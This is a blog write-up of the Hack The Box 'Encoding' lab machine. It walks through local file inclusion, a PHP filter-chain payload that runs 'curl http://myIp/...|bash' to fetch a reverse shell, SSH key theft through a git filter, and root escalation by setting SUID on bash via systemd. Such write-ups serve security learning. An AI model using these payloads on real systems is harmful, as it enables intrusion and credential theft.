<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Encoding [Medium] | 0x73796C31</title><meta name=keywords content="hackthebox"><meta name=description content="This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.
You will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE
Flag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-encoding/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - Encoding [Medium]"><meta property="og:description" content="This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.
You will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE
Flag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-encoding/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-02-17T02:01:27+03:00"><meta property="article:modified_time" content="2023-02-17T02:01:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Encoding [Medium]"><meta name=twitter:description content="This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.
You will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE
Flag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Encoding [Medium]","item":"https://sy1.sh/writeups/htb-encoding/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Encoding [Medium]","name":"Hack The Box - Encoding [Medium]","description":"This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.\nYou will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE\nFlag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on.","keywords":["hackthebox"],"articleBody":"This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.\nYou will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE\nFlag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on. But the interesting part was this:\nIf required, you can specify a URL that will return data to be converted with the file_url parameter. This can be done for both string and integer convertions.\nThat quickly reminded me of local/remote file inclusion, and so I’ve tried it with the following payload:\njson_data = { 'action': 'b64encode', 'file_url' : 'file:///etc/passwd' } That gave me the contents of the /etc/passwd file encoded in base64, I used base64 -d to decode it. From there I saw another user svc.\nI was also curious what’s in the /var/www/ directory, so I began enumerating the directory.\nI ran ffuf on the main website haxtables.htb/FUZZ also ran ffuf for subdomain discovery.\n$ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ $ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H \"Host: FUZZ.haxtables.htb\" -fs 1999 With those I found api, image subdomains, so I inspected them via the LFI vulnerability /var/www/image/index.php to check whether this application uses some kind of database or eventually some useful things. I found that image domain contains a git repository (through git_status, git_log, git_commit functions in /var/www/image/index.php -\u003e uitls.php). This led me to believe that I could use that to gain user privileges later on. I decided to dump the repository and bear with me here I did it in the most ghetto way possible, through a local server that acted as a proxy for gitdumper.sh\nimport requests import json from flask import Flask import base64 app = Flask(__name__) @app.route('/') def index(filepath): json_data = { 'action': 'b64encode', 'file_url' : \"file://\" + \"/var/www/image/\" + filepath } response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data) d = json.loads(response.text.strip()) res = base64.b64decode(d[\"data\"]) return res $ gitdumper.sh http://localhost:5000/.git/ ./dump_repo Then I used the git ls-files to figure what other files are in the folder.\n$ git ls-files actions/action_handler.php actions/image2pdf.php assets/img/forestbridge.jpg includes/coming_soon.html index.php scripts/git-commit.sh utils.php I saw the actions/action_handler.php source code by using the LFI vulnerability.\n\u003c?php include_once 'utils.php'; if (isset($_GET['page'])) { $page = $_GET['page']; include($page); # \u003c-- BruhMoment } else { echo jsonify(['message' =\u003e 'No page specified!']); } ?\u003e It is pretty obvious that this code is vulnerable to LFI, and I can use it to gain a reverse shell through PHP Filters. But I can’t access this page directly, so I can use the first LFI to execute this LFI to execute the PHP filters RCE…\nAnd this is me figuring out this after 2 days of trying…\nI generated a payload with the PHP filter chain generator.\n$ python3 php_filter_chain_generator.py --chain '\u003c?= `curl http://myIp/rev_bash_norm.sh|bash` ;?\u003e' And I hosted a web server containing the rev_bash_norm.sh, I won’t show the full monstrosity of the generated filter request but in the end it looked like this:\nPOST /v3/tools/string/index.php HTTP/1.1 Host: api.haxtables.htb Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/json Content-Length: 12920 { \"action\": \"b64encode\", \"file_url\" : \"email@image.haxtables.htb/actions/action_handler.php?page=php://filter/\" } Whenever executed, this request will spawn a reverse shell.\nThe www-data to svc(user) was honestly too much for me, and I turned to some write-ups.\nThe next section is what I’ve tried and failed, feel free to skip it.\nI was pretty sure that it has something to do with the git scripts and I only had rwxr-xr-x permissions of the .git folder, so I’ve tried to simulate file edit by using the dumped repository and change all the files in the .git directory on the server.\nAnd that was kinda the right approach, but I didn’t notice the ssh keys that I needed to retrieve, so I was hard stuck at this, and I went to some write-ups.\nCheck gatogamer1155’s write-up for gaining access to the user and retrieve the first flag.\nTLDR:\nCreates an executable file /tmp/readkey with a content that reads the ~/.ssh/id_rsa file and saves it to file. Creates a git attributes file with a new filter called indent: '*.php filter=indent' Sets the Git configuration filter.indent.clean to the command /tmp/readkey. This tells Git to apply the indent filter to files ending in .php and to use the /tmp/readkey command to process the filter. Execute the /var/www/image/scripts/git-commit.sh with sudo -u svc The filter is then applied, and you can read the private key file. NOTE: Make sure that whenever you save the private key on your machine add an empty line at the end of the file otherwise you will get an error!\nAfter logging with the svc user, you can read the first flag.\nFlag 2 Honestly, this was too easy, but I didn’t mind it since I spent too much time doing this box.\nExecuting the sudo -l would give you the executables that you can execute as root.\n(root) NOPASSWD: /usr/bin/systemctl restart * I had to create a service that looks like that and place it under /etc/systemd/system/syl.service\n[Service] Type=simple ExecStart=chmod +s /bin/bash [Install] WantedBy=multi-user.target And simply execute:\n$ sudo /usr/bin/systemctl restart syl $ bash -p bash-5.1# cat root/root.txt . . . ","wordCount":"893","inLanguage":"en","datePublished":"2023-02-17T02:01:27+03:00","dateModified":"2023-02-17T02:01:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-encoding/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>About</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - Encoding [Medium]</h1><div class=post-meta><span title='2023-02-17 02:01:27 +0300 +0300'>February 17, 2023</span>&nbsp;·&nbsp;5 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#flag-1 aria-label="Flag 1">Flag 1</a></li><li><a href=#flag-2 aria-label="Flag 2">Flag 2</a></li></ul></div></details></div><div class=post-content><p>This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.</p><p>You will find the following vulnerabilities:
- <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion>Local File Inclusion</a>
- <a href=https://book.hacktricks.xyz/pentesting-web/command-injection>Command Injection or RCE</a></p><h1 id=flag-1>Flag 1<a hidden class=anchor aria-hidden=true href=#flag-1>#</a></h1><p>I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on. But the interesting part was this:</p><blockquote><p>If required, you can specify a URL that will return data to be converted with the <code>file_url</code> parameter. This can be done for both string and integer convertions.</p></blockquote><p>That quickly reminded me of local/remote file inclusion, and so I&rsquo;ve tried it with the following payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>json_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;b64encode&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;file_url&#39;</span> <span class=p>:</span> <span class=s1>&#39;file:///etc/passwd&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>That gave me the contents of the <code>/etc/passwd</code> file encoded in base64, I used <code>base64 -d</code> to decode it. From there I saw another user <code>svc</code>.</p><p>I was also curious what&rsquo;s in the <code>/var/www/</code> directory, so I began enumerating the directory.</p><p>I ran <code>ffuf</code> on the main website <code>haxtables.htb/FUZZ</code> also ran <code>ffuf</code> for subdomain discovery.</p><pre tabindex=0><code>$ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ

$ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H &#34;Host: FUZZ.haxtables.htb&#34; -fs 1999
</code></pre><p>With those I found <code>api, image</code> subdomains, so I inspected them via the LFI vulnerability <code>/var/www/image/index.php</code> to check whether this application uses some kind of database or eventually some useful things. I found that <code>image</code> domain contains a git repository (through <code>git_status, git_log, git_commit</code> functions in <code>/var/www/image/index.php -> uitls.php</code>). This led me to believe that I could use that to gain user privileges later on. I decided to dump the repository and bear with me here I did it in the most ghetto way possible, through a local server that acted as a proxy for <code>gitdumper.sh</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&lt;path:filepath&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>(</span><span class=n>filepath</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>json_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;b64encode&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;file_url&#39;</span> <span class=p>:</span> <span class=s2>&#34;file://&#34;</span> <span class=o>+</span> <span class=s2>&#34;/var/www/image/&#34;</span> <span class=o>+</span> <span class=n>filepath</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;http://api.haxtables.htb/v3/tools/string/index.php&#39;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>json_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>d</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span></code></pre></div><pre tabindex=0><code>$ gitdumper.sh http://localhost:5000/.git/ ./dump_repo
</code></pre><p>Then I used the <code>git ls-files</code> to figure what other files are in the folder.</p><pre tabindex=0><code>$ git ls-files
actions/action_handler.php
actions/image2pdf.php
assets/img/forestbridge.jpg
includes/coming_soon.html
index.php
scripts/git-commit.sh
utils.php
</code></pre><p>I saw the <code>actions/action_handler.php</code> source code by using the LFI vulnerability.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include_once</span> <span class=s1>&#39;utils.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=nv>$page</span><span class=p>);</span> <span class=c1># &lt;-- BruhMoment
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>jsonify</span><span class=p>([</span><span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;No page specified!&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>It is pretty obvious that this code is vulnerable to LFI, and I can use it to gain a reverse shell through PHP Filters. But I can&rsquo;t access this page directly, so I can use the first LFI to execute this LFI to execute the PHP filters RCE&mldr;</p><p>And this is me figuring out this after 2 days of trying&mldr;</p><p><img loading=lazy src=/random/rwojak.jpg alt=rwojak></p><p>I generated a payload with the <a href=https://github.com/synacktiv/php_filter_chain_generator>PHP filter chain generator</a>.</p><pre tabindex=0><code>$ python3 php_filter_chain_generator.py --chain &#39;&lt;?= `curl http://myIp/rev_bash_norm.sh|bash` ;?&gt;&#39;
</code></pre><p>And I hosted a web server containing the <code>rev_bash_norm.sh</code>, I won&rsquo;t show the full monstrosity of the generated filter request but in the end it looked like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/v3/tools/string/index.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>api.haxtables.htb</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>12920</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;b64encode&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;file_url&#34;</span> <span class=p>:</span> <span class=s2>&#34;email@image.haxtables.htb/actions/action_handler.php?page=php://filter/&lt;bruhmoment&gt;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Whenever executed, this request will spawn a reverse shell.</p><p>The <code>www-data</code> to <code>svc(user)</code> was honestly too much for me, and I turned to some write-ups.</p><blockquote><p>The next section is what I&rsquo;ve tried and failed, feel free to skip it.</p></blockquote><p><code>&lt;i-tried-this></code>
I was pretty sure that it has something to do with the <code>git</code> scripts and I only had <code>rwxr-xr-x</code> permissions of the <code>.git</code> folder, so I&rsquo;ve tried to simulate file edit by using the dumped repository and change all the files in the <code>.git</code> directory on the server.</p><p>And that was kinda the right approach, but I didn&rsquo;t notice the <code>ssh</code> keys that I needed to retrieve, so I was hard stuck at this, and I went to some write-ups.</p><p><code>&lt;/i-tried-this></code></p><p>Check <a href=https://gatogamer1155.github.io/htb/encoding/>gatogamer1155</a>&rsquo;s write-up for gaining access to the user and retrieve the first flag.</p><p>TLDR:</p><ul><li>Creates an executable file <code>/tmp/readkey</code> with a content that reads the
<code>~/.ssh/id_rsa</code> file and saves it to file.</li></ul><ul><li>Creates a git attributes file with a new filter called indent: <code>'*.php filter=indent'</code></li><li>Sets the Git configuration <code>filter.indent.clean</code> to the command <code>/tmp/readkey</code>. This tells Git to apply the <code>indent</code> filter to files ending in <code>.php</code> and to use the <code>/tmp/readkey</code> command to process the filter.</li><li>Execute the <code>/var/www/image/scripts/git-commit.sh</code> with <code>sudo -u svc</code></li><li>The filter is then applied, and you can read the private key file.</li></ul><blockquote><p><strong>NOTE:</strong> Make sure that whenever you save the private key on your machine add an empty line at the end of the file otherwise you will get an error!</p></blockquote><p>After logging with the <code>svc</code> user, you can read the first flag.</p><h1 id=flag-2>Flag 2<a hidden class=anchor aria-hidden=true href=#flag-2>#</a></h1><p>Honestly, this was too easy, but I didn&rsquo;t mind it since I spent too much time doing this box.</p><p>Executing the <code>sudo -l</code> would give you the executables that you can execute as root.</p><pre tabindex=0><code>(root) NOPASSWD: /usr/bin/systemctl restart *
</code></pre><p>I had to create a service that looks like that and place it under <code>/etc/systemd/system/syl.service</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-toml data-lang=toml><span class=line><span class=cl><span class=p>[</span><span class=nx>Service</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>Type</span><span class=p>=</span><span class=nx>simple</span>
</span></span><span class=line><span class=cl><span class=nx>ExecStart</span><span class=p>=</span><span class=nx>chmod</span> <span class=err>+</span><span class=nx>s</span> <span class=err>/</span><span class=nx>bin</span><span class=err>/</span><span class=nx>bash</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>Install</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>WantedBy</span><span class=p>=</span><span class=nx>multi-user</span><span class=p>.</span><span class=nx>target</span>
</span></span></code></pre></div><p>And simply execute:</p><pre tabindex=0><code>$ sudo /usr/bin/systemctl restart syl
$ bash -p
bash-5.1# cat root/root.txt
. . .
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://sy1.sh/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://sy1.sh/writeups/pg-photographer/><span class=title>« Prev</span><br><span>Proving Grounds (OSCP) - Photographer</span></a>
<a class=next href=https://sy1.sh/writeups/htb-vessel/><span class=title>Next »</span><br><span>Hack The Box - Vessel [Hard]</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>